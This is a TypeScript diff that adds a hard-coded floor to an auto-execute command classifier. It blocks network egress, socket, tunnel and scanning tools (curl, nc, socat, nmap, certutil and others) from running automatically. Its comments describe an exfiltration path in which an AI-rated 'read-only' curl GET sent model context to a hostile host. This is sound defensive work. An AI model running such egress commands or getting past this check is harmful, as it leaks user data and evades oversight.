@@ -122,6 +122,42 @@ const RUNNER_COMMANDS: Set<string> = new Set([
     'vi', 'vim', 'nvim', 'emacs', 'nano', 'ed', 'less', 'more', 'man',
 ]);
 
+// ── Network-egress / scanning commands ──────────────────────────────────────
+//
+// Tools that can ship the model's context off the box (or scan the network) in a
+// single read-shaped invocation. `commandLists.ts` states the rule — curl/wget/
+// nmap "must never auto-execute in auto-execute-safe mode" — but leaving them
+// merely un-whitelisted did NOT enforce it: in `hybrid`/`ai` they fall through to
+// the AI verdict, and a plain GET (`curl https://host/?x=<data>`) is commonly
+// rated read-only, so it auto-ran. Terminal output from a hostile host is fed to
+// the model, so that is a working exfiltration path.
+//
+// This lives in code rather than in DEFAULT_BLACKLIST on purpose: the blacklist
+// is user-editable and seeded once, so a user who resets or prunes it would
+// silently lose the guard. As a floor it also applies to all three strategies.
+const NETWORK_EGRESS_COMMANDS: Set<string> = new Set([
+    // Transfer / fetch
+    'curl', 'wget', 'ftp', 'tftp', 'scp', 'sftp', 'rsync',
+    // Raw sockets / tunnels
+    'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ssh',
+    // Scanners
+    'nmap', 'masscan', 'zmap',
+    // Windows living-off-the-land downloaders
+    'bitsadmin', 'certutil', 'start-bitstransfer',
+    'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm',
+]);
+
+/**
+ * Strip a segment's base command down to a comparable name: drop any directory
+ * prefix (`/usr/bin/curl`, `C:\Windows\System32\certutil.exe`) and a trailing
+ * `.exe`, then lowercase. Without this, a fully-qualified path walks straight
+ * past a bare-name Set lookup.
+ */
+function normalizeBaseCommand(base: string): string {
+    const leaf = base.split(/[\\/]/).pop() ?? base;
+    return leaf.toLowerCase().replace(/\.exe$/, '');
+}
+
 // ── Public API ──────────────────────────────────────────────────────────────
 
 export interface StructuralDanger {
@@ -153,6 +189,39 @@ export function structuralDanger(command: string): StructuralDanger {
         for (const { pattern, reason } of DANGER_PATTERNS) {
             if (pattern.test(line)) {
                 return { danger: true, reason };
+            }
+        }
+    }
+    return { danger: false, reason: '' };
+}
+
+/**
+ * Network-egress floor: whether any line/pipe segment invokes a transfer,
+ * raw-socket, tunnel or scanning tool. Such a command never auto-executes,
+ * whatever the AI verdict rates it — see {@link NETWORK_EGRESS_COMMANDS}.
+ *
+ * Applied by the auto-exec orchestrator immediately after
+ * {@link structuralDanger}, i.e. before the `ai`-strategy early return, so all
+ * three strategies are covered. A manual Run is still offered.
+ *
+ * Splits on CR/LF and `|` exactly like {@link classifyCommand}, so an egress
+ * tool hidden after a bare CR or behind a pipe can't slip past the scan.
+ */
+export function networkEgressDanger(command: string): StructuralDanger {
+    const lines = command
+        .split(/\r\n|\r|\n/)
+        .map((l) => l.trim())
+        .filter((l) => l.length > 0);
+    for (const line of lines) {
+        for (const segment of line.split('|')) {
+            const base = extractBaseCommand(segment);
+            if (!base) continue;
+            const name = normalizeBaseCommand(base);
+            if (NETWORK_EGRESS_COMMANDS.has(name)) {
+                return {
+                    danger: true,
+                    reason: `"${name}" can send data off this host — needs manual review`,
+                };
             }
         }
     }
